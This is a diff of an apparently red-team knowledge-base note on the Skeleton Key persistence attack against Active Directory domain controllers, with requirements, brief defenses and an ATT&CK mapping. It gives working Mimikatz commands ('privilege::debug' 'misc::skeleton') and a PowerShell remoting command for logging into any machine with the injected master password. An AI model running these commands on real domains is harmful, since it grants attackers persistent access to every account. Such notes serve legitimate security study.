@@ -36,11 +36,15 @@ To execute a Skeleton Key Persistence attack, an attacker must first gain admini
 
 The business value of this attack is that it allows attackers to maintain persistent access to the domain, making it easier for them to exfiltrate sensitive data or carry out further attacks.
 
+ 
+
 ## Requirements
 
 1. Administrative access to the domain controller
 
 1. Mimikatz or similar tool
+
+ 
 
 ## Defense
 
@@ -50,20 +54,32 @@ The business value of this attack is that it allows attackers to maintain persis
 
 1. Regularly review and update access controls to limit administrative access to the domain controller
 
+ 
+
 ## Objectives
 
 1. Gain persistent access to the domain controller
 
 1. Bypass password-based authentication mechanisms
 
+ 
+
 # Instructions
 
 1. Execute the Skeleton Key Attack by running the commands provided.
 
+ 
+
+
+
 **Code**: [[# Execute the skeleton key attack
 mimikatz "privil]]
 
+
+
 > The Skeleton Key Attack is a technique used to bypass Active Directory authentication. It works by injecting a fake password into the authentication process, allowing an attacker to gain access to any account in the domain. This can be done by using the Mimikatz tool, which is a post-exploitation tool that allows attackers to extract credentials from memory. The first two commands in the provided script execute the Skeleton Key Attack using Mimikatz. The last command demonstrates how to access a machine using the password 'mimikatz'. Note that this attack requires administrative privileges on the domain controller.
+
+
 
 **Command** ([[Execute skeleton key attack using Mimikatz]]):
 
@@ -71,11 +87,17 @@ mimikatz "privil]]
 mimikatz "privilege::debug" "misc::skeleton"
 ```
 
+
+
+
+
 **Command** ([[Access machine using password]]):
 
 ```bash
 Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -98,3 +120,5 @@ Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administr
 - [[Elevated]]
 - [[Skeleton Key]]
 - [[Windows - Persistence]]
+
+
